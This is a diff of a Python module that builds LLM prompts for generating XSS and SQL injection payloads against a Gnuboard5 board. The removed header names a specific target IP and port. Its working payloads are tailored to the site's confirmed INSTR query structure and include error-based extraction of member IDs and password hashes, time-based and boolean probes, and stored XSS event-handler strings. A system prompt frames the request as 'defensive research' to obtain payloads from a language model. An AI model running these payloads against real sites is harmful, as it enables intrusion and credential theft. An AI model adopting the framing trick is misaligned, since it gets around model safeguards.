@@ -1,24 +1,7 @@
-"""
-Context Builder - Gnuboard5 서버 실제 분석 기반 타겟 프롬프트
-Target: http://34.68.27.120:8081/ (Gnuboard5, Apache+PHP+MySQL)
-
-[수동 분석 결과]
-XSS:
-  - wr_subject : 홈 메인/게시글 상단/관리자에 반영 → Stored XSS 고가치
-  - wr_content : img·a·b·p 태그 허용, script 차단 → 이벤트핸들러 우회 필요
-  - stx(search) : value="" 속성에 반영, onfocus=alert(1) → onfocusalert1 필터
-  - wr_content(댓글): http:// 형태만 <a href>로 변환, javascript: 안됨
-
-SQLi:
-  - sfl  : 검색 필드 선택자(wr_subject 등), SQL에 직접 연결 가능성
-  - sst  : ORDER BY 컬럼명, 직접 연결 → ORDER BY Injection
-  - sod  : ASC/DESC, 직접 연결 → ORDER BY Injection
-  - stx  : LIKE '%{input}%' 문자열 컨텍스트
-"""
-
-from typing import Any, Dict
+﻿from typing import Any, Dict
 
 
+# LLM 시스템 프롬프트
 SYSTEM_PROMPT = (
     "You are a cybersecurity expert specializing in web application attacks. "
     "Generate security test payloads for defensive research purposes only. "
@@ -27,10 +10,7 @@ SYSTEM_PROMPT = (
 )
 
 
-# ════════════════════════════════════════════════════════════════
-#  XSS
-# ════════════════════════════════════════════════════════════════
-
+# XSS 빌더
 def build_xss_subject(point: Dict[str, Any], count: int = 5) -> str:
     """
     wr_subject - 게시글 제목 Stored XSS
@@ -204,10 +184,7 @@ STORED_XSS | url_attr_inject | http://x.x" onmouseover="alert(1)
 STORED_XSS | img_onerror | <img src=x onerror=alert(1)>"""
 
 
-# ════════════════════════════════════════════════════════════════
-#  SQLi - Gnuboard5 타겟 특화
-# ════════════════════════════════════════════════════════════════
-
+# SQLi 빌더 - Gnuboard5 특화
 def build_sqli_orderby(point: Dict[str, Any], count: int = 5) -> str:
     """
     sst / sod - ORDER BY Injection
@@ -303,53 +280,91 @@ SQLI_FIELD | error_extractvalue | EXTRACTVALUE(1,CONCAT(0x7e,database()))"""
 
 def build_sqli_string(point: Dict[str, Any], count: int = 5) -> str:
     """
-    stx / sca - 문자열 컨텍스트 SQLi
-    LIKE '%{input}%' 형태로 사용
-    addslashes() 또는 mysqli_real_escape_string() 적용 가능
-    멀티바이트 문자셋 우회 또는 필터 우회 시도
+    stx - 검색 키워드 SQLi (Gnuboard5 INSTR 컨텍스트)
+
+    [실제 SQL 구조 - 브라우저 에러 메시지로 직접 확인]
+    PHP가 stx를 공백으로 단어 분리 후 각 단어를 아래 형태로 래핑:
+      WHERE ((INSTR(LOWER(wr_subject), LOWER('WORD1')))) AND ((INSTR(LOWER(wr_subject), LOWER('WORD2'))))
+
+    CRITICAL CONSTRAINTS (위반 시 페이로드 무효):
+    1. 페이로드에 공백 절대 금지 - 공백이 있으면 PHP가 단어분리하여 별도 INSTR 조건이 됨
+    2. 주석은 # 사용 (-- 는 MySQL에서 뒤에 공백 필요 -> 공백 쓰면 단어분리 발생)
+    3. 따옴표 닫은 뒤 괄호 4개 닫아야 함: a'))))
+         '  -> LOWER()의 문자열 리터럴 닫기
+         )  -> LOWER() 함수 닫기
+         )  -> INSTR() 함수 닫기
+         )) -> 외부 (( 래퍼 닫기
+    4. 서브쿼리 내부 공백은 /**/ 로 대체
+    5. SLEEP 계열은 SQL 에러가 먼저 발생하면 실행 안 됨 (에러기반 우선)
     """
-    return f"""Target: Gnuboard5 search keyword / category parameter
+    return f"""Target: Gnuboard5 search keyword parameter
 Endpoint: GET {point.get('url')}, parameter: {point.get('param', 'stx')}
-Injection context: String LIKE query:
-  SELECT * FROM g5_write_free WHERE wr_subject LIKE '%{{input}}%'
 
-Filter info: Gnuboard5 uses addslashes() or mysqli_real_escape_string()
-Single/double quotes are likely escaped with backslash.
+ACTUAL SQL STRUCTURE (confirmed via MySQL error page):
+  PHP splits stx by SPACES into words, each wrapped in this template:
+    WHERE ((INSTR(LOWER(wr_subject), LOWER('WORD'))))
 
-Generate {count} SQLi payloads for string context with escape mitigation.
-Attack techniques:
+  For a single-word input the full WHERE clause is:
+    WHERE ((INSTR(LOWER(wr_subject), LOWER('{{input}}'))))
 
-1. If escape can be bypassed via multiline/comment:
-   %' OR 1=1-- -
-   %' AND SLEEP(5)-- -
+CRITICAL CONSTRAINTS — violating any one will break the injection:
+  1. ZERO spaces anywhere in the payload
+       Reason: PHP does stx.split(' ') -> each word becomes its own INSTR condition
+       If your payload has a space, it becomes TWO separate INSTR conditions -> SQL syntax error
+  2. Use # as the comment terminator, NOT -- or -- -
+       Reason: -- requires a trailing space in MySQL, but spaces are forbidden (rule 1)
+  3. Must close FOUR parentheses after the injected quote:  a'))))
+       '   closes the LOWER() string literal
+       )   closes LOWER()
+       )   closes INSTR()
+       ))  closes the outer (( wrapper from the PHP template
+  4. Spaces inside subqueries must be replaced with /**/
+       Example: SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables
+  5. Error-based payloads fire before SLEEP() executes — prefer EXTRACTVALUE for data extraction
 
-2. Second-order injection (if stored then re-used):
-   admin'-- -
+Escape/injection pattern:
+  Input:   a'))))INJECTION_HERE#
+  SQL:     WHERE ((INSTR(LOWER(wr_subject), LOWER('a'))))INJECTION_HERE#'))))
+                                                          ^^^^^^^^^^^^^^^^ your code runs here
+                                                                          ^ # comments out remaining '))))
 
-3. Numeric subquery without quotes:
-   %' AND (SELECT 1 FROM dual WHERE 1=1)='1
+Generate {count} SQLi payloads for this INSTR string context.
+ALL payloads MUST:
+  - Start with:  a'))))
+  - End with:    #
+  - Contain NO space characters (use /**/ inside subqueries instead)
 
-4. Unicode/encoding bypass:
-   %\u0027 OR 1=1-- -
-   %' OR '1'='1
+Attack techniques to cover:
 
-5. Wildcard abuse for information disclosure:
-   % (returns all records)
-   %admin% (reveals existence of admin)
-   %password%
+1. BOOLEAN TRUE / FALSE pair (baseline detection):
+   a'))))OR(1=1)#          <- TRUE  — returns all rows
+   a'))))AND(1=2)#         <- FALSE — returns zero rows
 
-6. If quotes aren't escaped (misconfiguration):
-   ' OR SLEEP(5)-- -
-   ' UNION SELECT 1,2,3-- -
-   ' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -
+2. BOOLEAN with conditional subqueries (/**/ replaces every space):
+   a'))))AND(LENGTH(database())>0)#
+   a'))))AND(SUBSTR(database(),1,1)>'a')#
+   a'))))AND((SELECT(1)FROM(information_schema.tables)LIMIT(0,1))=1)#
+
+3. ERROR-BASED data extraction via EXTRACTVALUE:
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,version())))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()))))#
+   a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/CONCAT(mb_id,0x3a,mb_password)/**/FROM/**/g5_member/**/LIMIT/**/0,1))))#
+
+4. TIME-BASED blind via SLEEP (use only if no errors triggered):
+   a'))))AND(SLEEP(5))#
+   a'))))AND(IF(1=1,SLEEP(5),0))#
 
 Output format (one line per payload, no other text):
 TYPE | PATTERN_FAMILY | PAYLOAD
 
 Example:
-SQLI_STRING | quote_escape_basic | ' OR 1=1-- -
-SQLI_STRING | time_sleep | ' AND SLEEP(5)-- -
-SQLI_STRING | union_probe | ' UNION SELECT 1,2,3-- -"""
+BOOLEAN | instr_true | a'))))OR(1=1)#
+BOOLEAN | instr_false | a'))))AND(1=2)#
+SQLI_ERROR | extract_db | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,database())))#
+SQLI_ERROR | extract_tables | a'))))AND(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()))))#
+TIME_BASED | instr_sleep | a'))))AND(SLEEP(5))#"""
+
 
 
 def build_sqli_login(point: Dict[str, Any], count: int = 5) -> str:
@@ -399,10 +414,7 @@ SQLI_LOGIN | tautology | ' OR '1'='1'-- -
 SQLI_LOGIN | time_sleep | ' AND SLEEP(5)-- -"""
 
 
-# ════════════════════════════════════════════════════════════════
-#  기존 일반 SQLi (호환성 유지)
-# ════════════════════════════════════════════════════════════════
-
+# SQLi 빌더 - 일반형 (호환성 유지)
 def build_sqli_error(point: Dict[str, Any], count: int = 5) -> str:
     return f"""Target SQL injection - Error-based
 Endpoint: {point.get('method','GET')} {point.get('url')}, parameter: {point.get('param')}
@@ -479,10 +491,9 @@ TAUTOLOGY | numeric_basic | 0 OR (1=1)
 CONDITIONAL | ascii_compare | 0 OR ASCII(SUBSTRING(database(),1,1))>64"""
 
 
-# ════════════════════════════════════════════════════════════════
 #  Router
-# ════════════════════════════════════════════════════════════════
 
+# 라우터 - vuln_type 문자열 → 빌더 함수 매핑
 BUILDERS = {
     # XSS - 서버 분석 기반
     "xss_subject":     build_xss_subject,      # wr_subject: 제목 Stored XSS
@@ -514,7 +525,6 @@ def build_prompt(point: Dict[str, Any], vuln_type: str, **kwargs) -> str:
     return builder(point, **kwargs)
 
 
-# ── 직접 실행 시 프롬프트 미리보기 ──────────────────────────────
 if __name__ == "__main__":
     sample_xss = {
         "url": "/bbs/write_update.php", "method": "POST",
